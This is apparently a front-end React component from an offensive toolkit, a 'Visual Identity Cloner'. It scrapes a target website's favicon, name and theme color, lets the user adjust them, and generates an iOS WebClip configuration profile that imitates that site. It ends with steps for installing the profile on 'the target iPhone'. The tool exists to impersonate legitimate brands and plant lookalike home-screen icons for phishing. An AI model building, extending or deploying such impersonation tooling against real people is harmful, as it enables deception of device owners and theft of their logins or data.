import React, { useState } from 'react';
import { apiFetch } from '../api/client.js';

const C = {
  bg: '#07080f',
  surface: '#0c0d1a',
  surface2: '#10121f',
  surface3: '#141728',
  border: 'rgba(255,255,255,0.05)',
  borderMd: 'rgba(255,255,255,0.09)',
  borderHi: 'rgba(59,130,246,0.32)',
  text: '#c9d1e8',
  text2: '#4e5a70',
  accent: '#3b82f6',
  accentBg: 'rgba(59,130,246,0.09)',
  green: '#22c55e',
  greenBg: 'rgba(34,197,94,0.09)',
  red: '#ef4444',
  redBg: 'rgba(239,68,68,0.09)',
  mono: "ui-monospace,'Cascadia Code','Fira Code','JetBrains Mono',monospace",
  sans: "-apple-system,BlinkMacSystemFont,'Inter',system-ui,sans-serif",
};

const S = {
  label: {
    fontSize: 10, fontWeight: 700, color: C.text2, textTransform: 'uppercase',
    letterSpacing: '0.09em', marginBottom: 6, display: 'block',
  },
  input: {
    width: '100%', background: C.surface2, border: `1px solid ${C.borderMd}`, borderRadius: 6,
    padding: '7px 10px', color: C.text, fontSize: 13, outline: 'none',
    boxSizing: 'border-box',
  },
  btnPrimary: {
    background: C.accent, border: 'none', borderRadius: 6, padding: '0 12px',
    color: '#fff', fontSize: 12, fontWeight: 600, cursor: 'pointer', height: 30,
    display: 'inline-flex', alignItems: 'center',
  },
  btnGhost: {
    background: 'transparent', border: `1px solid ${C.borderMd}`, borderRadius: 6,
    padding: '0 12px', color: C.text, fontSize: 12, fontWeight: 600, cursor: 'pointer', height: 30,
    display: 'inline-flex', alignItems: 'center',
  },
  btnGreen: {
    background: C.greenBg, border: '1px solid rgba(34,197,94,0.25)', borderRadius: 6,
    padding: '0 12px', color: C.green, fontSize: 12, fontWeight: 600, cursor: 'pointer', height: 30,
    display: 'inline-flex', alignItems: 'center',
  },
  sectionLabel: {
    fontSize: 10, fontWeight: 700, color: C.text2, marginBottom: 12,
    textTransform: 'uppercase', letterSpacing: '0.09em',
  },
};

function Spinner() {
  return (
    <div style={{ display: 'flex', alignItems: 'center', gap: 8, color: C.text2, fontSize: 12 }}>
      <div style={{
        width: 14, height: 14, border: `2px solid ${C.borderMd}`,
        borderTop: `2px solid ${C.accent}`, borderRadius: '50%',
        animation: 'spin 0.7s linear infinite',
      }} />
      Fetching target identity...
      <style>{`@keyframes spin { to { transform: rotate(360deg); } }`}</style>
    </div>
  );
}

function IPhoneMock({ faviconB64, appName, themeColor }) {
  return (
    <div style={{
      background: C.surface2, borderRadius: 8, padding: 20,
      display: 'flex', flexDirection: 'column', alignItems: 'center', gap: 10,
      border: `1px solid ${C.borderMd}`, minWidth: 160,
    }}>
      <div style={{ fontSize: 10, color: C.text2, marginBottom: 2 }}>iOS Home Screen Preview</div>
      <div style={{
        background: 'linear-gradient(135deg, #0d1120 0%, #111827 100%)',
        borderRadius: 14, padding: '24px 32px', display: 'flex',
        flexDirection: 'column', alignItems: 'center', gap: 6,
        border: `1px solid ${C.border}`,
      }}>
        <div style={{
          width: 60, height: 60, borderRadius: 13,
          background: themeColor || C.accent,
          overflow: 'hidden', display: 'flex', alignItems: 'center', justifyContent: 'center',
          boxShadow: '0 4px 14px rgba(0,0,0,0.5)',
          flexShrink: 0,
        }}>
          {faviconB64
            ? <img src={faviconB64} alt="" style={{ width: '100%', height: '100%', objectFit: 'cover' }} />
            : <span style={{ fontSize: 28 }}>🌐</span>
          }
        </div>
        <div style={{
          fontSize: 11, color: '#fff', fontWeight: 500, textAlign: 'center',
          maxWidth: 70, overflow: 'hidden', whiteSpace: 'nowrap', textOverflow: 'ellipsis',
          textShadow: '0 1px 3px rgba(0,0,0,0.8)',
        }}>
          {appName || 'App Name'}
        </div>
      </div>
      <div style={{ fontSize: 10, color: C.text2, textAlign: 'center' }}>
        Tap icon appears after profile install
      </div>
    </div>
  );
}

function IdentityCard({ favicon, domain, themeColor }) {
  return (
    <div style={{
      background: C.surface3,
      borderLeft: `3px solid ${themeColor || C.accent}`,
      border: `1px solid ${C.borderMd}`,
      borderRadius: 8,
      padding: '12px 14px',
      display: 'flex', alignItems: 'center', gap: 14,
    }}>
      <div style={{
        width: 44, height: 44, borderRadius: 8, overflow: 'hidden', flexShrink: 0,
        background: themeColor || C.accent,
        display: 'flex', alignItems: 'center', justifyContent: 'center',
      }}>
        {favicon
          ? <img src={favicon} alt="" style={{ width: '100%', height: '100%', objectFit: 'cover' }} />
          : <span style={{ fontSize: 22 }}>🌐</span>
        }
      </div>
      <div>
        <div style={{ fontSize: 13, fontWeight: 600, color: C.text }}>{domain}</div>
        <div style={{ fontSize: 11, color: C.text2, marginTop: 2 }}>
          Identity cloned - edit fields below
        </div>
      </div>
    </div>
  );
}

function Field({ label, children }) {
  return (
    <div style={{ marginBottom: 14 }}>
      <label style={S.label}>{label}</label>
      {children}
    </div>
  );
}

export default function Cloner() {
  const [url, setUrl]           = useState('');
  const [loading, setLoading]   = useState(false);
  const [error, setError]       = useState('');
  const [fetched, setFetched]   = useState(null);

  const [appName, setAppName]   = useState('');
  const [subtitle, setSubtitle] = useState('');
  const [themeColor, setColor]  = useState(C.accent);

  const [genLoading, setGenLoading] = useState(false);
  const [genResult, setGenResult]   = useState(null);
  const [genError, setGenError]     = useState('');

  const handleFetch = async () => {
    setError('');
    setGenResult(null);
    if (!url.trim()) { setError('Enter a target URL first.'); return; }
    setLoading(true);
    try {
      const data = await apiFetch('/api/cloner/fetch', {
        method: 'POST',
        body: JSON.stringify({ target_url: url.trim() }),
      });
      setFetched(data);
      setAppName(data.title || data.domain);
      setSubtitle(data.description || '');
      setColor(data.theme_color || C.accent);
    } catch (e) {
      setError(e.message || 'Fetch failed');
    } finally {
      setLoading(false);
    }
  };

  const handleGenerate = async () => {
    setGenError('');
    setGenLoading(true);
    try {
      const data = await apiFetch('/api/cloner/generate', {
        method: 'POST',
        body: JSON.stringify({
          title: fetched.title,
          favicon_b64: fetched.favicon_b64,
          theme_color: themeColor,
          app_name: appName,
          subtitle: subtitle,
          domain: fetched.domain,
        }),
      });
      setGenResult(data);
      const blob = new Blob([data.mobileconfig], { type: 'application/x-apple-aspen-config' });
      const href = URL.createObjectURL(blob);
      const a = document.createElement('a');
      a.href = href;
      a.download = data.filename;
      a.click();
      URL.revokeObjectURL(href);
    } catch (e) {
      setGenError(e.message || 'Generate failed');
    } finally {
      setGenLoading(false);
    }
  };

  const reset = () => {
    setFetched(null);
    setGenResult(null);
    setError('');
    setGenError('');
    setUrl('');
  };

  return (
    <div style={{ color: C.text, fontFamily: C.sans }}>
      {/* Header */}
      <div style={{ marginBottom: 24 }}>
        <h1 style={{ fontSize: 20, fontWeight: 700, margin: 0 }}>Visual Identity Cloner</h1>
        <div style={{ fontSize: 12, color: C.text2, marginTop: 4 }}>
          Clone a target site's visual identity and generate a matching WebClip mobileconfig.
        </div>
      </div>

      {/* Step 1 - URL input */}
      <div style={{
        background: C.surface3, border: `1px solid ${C.borderMd}`, borderRadius: 8,
        padding: '14px 16px', marginBottom: 16,
      }}>
        <div style={S.sectionLabel}>Step 1 - Target URL</div>
        <div style={{ display: 'flex', gap: 8 }}>
          <input
            style={S.input}
            value={url}
            onChange={e => setUrl(e.target.value)}
            placeholder="https://target.example.com"
            onKeyDown={e => e.key === 'Enter' && !loading && handleFetch()}
            disabled={loading || !!fetched}
          />
          {fetched
            ? <button style={S.btnGhost} onClick={reset}>Reset</button>
            : <button style={{ ...S.btnPrimary, ...(loading ? { opacity: 0.5, cursor: 'default' } : {}) }}
                onClick={handleFetch} disabled={loading}>
                {loading ? '...' : 'Clone Identity'}
              </button>
          }
        </div>
        {loading && <div style={{ marginTop: 12 }}><Spinner /></div>}
        {error && (
          <div style={{
            marginTop: 10, background: C.redBg, border: '1px solid rgba(239,68,68,0.2)',
            borderRadius: 6, padding: '8px 12px', fontSize: 12, color: C.red,
          }}>
            {error}
          </div>
        )}
      </div>

      {/* Step 2 - Preview & Edit */}
      {fetched && (
        <div style={{
          background: C.surface3, border: `1px solid ${C.borderMd}`, borderRadius: 8,
          padding: '14px 16px', marginBottom: 16,
        }}>
          <div style={S.sectionLabel}>Step 2 - Preview and Edit</div>

          <IdentityCard
            favicon={fetched.favicon_b64}
            domain={fetched.domain}
            themeColor={themeColor}
          />

          <div style={{ height: 16 }} />

          <div style={{ display: 'grid', gridTemplateColumns: '1fr auto', gap: 20, alignItems: 'start' }}>
            <div>
              <Field label="App Name (shown on home screen)">
                <input style={S.input} value={appName}
                  onChange={e => setAppName(e.target.value)} maxLength={60} />
              </Field>

              <Field label="Subtitle / Description">
                <input style={S.input} value={subtitle}
                  onChange={e => setSubtitle(e.target.value)} maxLength={160} />
              </Field>

              <Field label="Theme Color">
                <div style={{ display: 'flex', alignItems: 'center', gap: 8 }}>
                  <input
                    type="color" value={themeColor}
                    onChange={e => setColor(e.target.value)}
                    style={{ width: 36, height: 28, border: 'none', borderRadius: 6,
                             cursor: 'pointer', background: 'none', padding: 0 }}
                  />
                  <input style={{ ...S.input, width: 100 }} value={themeColor}
                    onChange={e => setColor(e.target.value)} maxLength={7} />
                </div>
              </Field>

              <Field label="Favicon (base64)">
                <div style={{ display: 'flex', alignItems: 'center', gap: 8 }}>
                  {fetched.favicon_b64 && (
                    <div style={{
                      width: 32, height: 32, borderRadius: 6, overflow: 'hidden',
                      background: C.surface2, border: `1px solid ${C.borderMd}`, flexShrink: 0,
                    }}>
                      <img src={fetched.favicon_b64} alt="" style={{ width: '100%', height: '100%', objectFit: 'cover' }} />
                    </div>
                  )}
                  <div style={{ fontSize: 11, color: C.text2 }}>
                    {fetched.favicon_b64?.startsWith('data:image/svg') ? 'SVG emoji fallback' : 'Downloaded from target'}
                  </div>
                </div>
              </Field>
            </div>

            <IPhoneMock
              faviconB64={fetched.favicon_b64}
              appName={appName}
              themeColor={themeColor}
            />
          </div>

          <div style={{ marginTop: 20, paddingTop: 16, borderTop: `1px solid ${C.border}` }}>
            <button
              style={{ ...S.btnPrimary, ...(genLoading ? { opacity: 0.5, cursor: 'default' } : {}) }}
              onClick={handleGenerate}
              disabled={genLoading}
            >
              {genLoading ? 'Generating...' : 'Generate mobileconfig'}
            </button>
            {genError && (
              <div style={{
                marginTop: 10, background: C.redBg, border: '1px solid rgba(239,68,68,0.2)',
                borderRadius: 6, padding: '8px 12px', fontSize: 12, color: C.red,
              }}>
                {genError}
              </div>
            )}
          </div>
        </div>
      )}

      {/* Step 3 - Success */}
      {genResult && (
        <div style={{
          background: C.surface3,
          border: `1px solid rgba(34,197,94,0.25)`,
          borderRadius: 8, padding: '14px 16px',
        }}>
          <div style={{ display: 'flex', alignItems: 'center', gap: 10, marginBottom: 14 }}>
            <div style={{
              width: 24, height: 24, borderRadius: 12, background: C.green,
              display: 'flex', alignItems: 'center', justifyContent: 'center',
              fontSize: 12, fontWeight: 700, color: '#fff', flexShrink: 0,
            }}>
              +
            </div>
            <div>
              <div style={{ fontSize: 13, fontWeight: 600, color: C.green }}>mobileconfig generated</div>
              <div style={{ fontSize: 11, color: C.text2, marginTop: 2 }}>{genResult.filename}</div>
            </div>
          </div>

          <div style={{
            background: C.surface2, border: `1px solid ${C.borderMd}`, borderRadius: 6, padding: '12px 14px',
          }}>
            <div style={{
              fontSize: 10, fontWeight: 700, color: C.text2,
              textTransform: 'uppercase', letterSpacing: '0.09em', marginBottom: 10,
            }}>
              Install on Device
            </div>
            <div style={{ display: 'flex', flexDirection: 'column', gap: 6 }}>
              {[
                '1. Serve the .mobileconfig file via HTTPS',
                '2. Open the URL on the target iPhone in Safari',
                '3. Go to Settings > General > VPN and Device Management',
                '4. Tap the profile and install',
              ].map(step => (
                <div key={step} style={{ fontSize: 12, color: C.text }}>{step}</div>
              ))}
            </div>
            <div style={{
              marginTop: 14, padding: '10px 14px', background: C.bg,
              borderRadius: 6, border: `1px dashed ${C.borderMd}`,
              textAlign: 'center', color: C.text2, fontSize: 11,
            }}>
              QR Code - Serve via HTTPS and scan with iPhone camera
            </div>
          </div>
        </div>
      )}
    </div>
  );
}
